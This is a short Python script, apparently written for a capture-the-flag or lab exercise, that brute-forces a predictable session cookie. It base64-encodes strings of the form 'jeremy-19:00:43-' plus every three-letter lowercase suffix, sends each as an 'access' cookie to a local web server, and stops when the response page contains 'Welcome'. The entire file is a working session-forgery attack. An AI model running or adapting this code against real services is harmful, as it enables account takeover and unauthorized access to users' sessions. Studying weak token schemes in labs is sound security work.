import sys
import string
import base64
import requests
from bs4 import BeautifulSoup

url = "http://172.18.0.2/"
chars = list(string.ascii_lowercase)

for char_0 in chars:
    for char_1 in chars:
        for char_2 in chars:
            data = f"jeremy-19:00:43-{char_0}{char_1}{char_2}"
            token = base64.b64encode(data.encode()).decode()

            print(f"Trying: {token} - {data}")

            cookie = {"access": token}
            response = requests.get(url, cookies=cookie)
            soup = BeautifulSoup(response.text, "html.parser")

            for line in soup.get_text().split("\n"):
                if 'Welcome ' in line:
                    print(f"Valid session token found: {token} - {data}")
                    sys.exit()
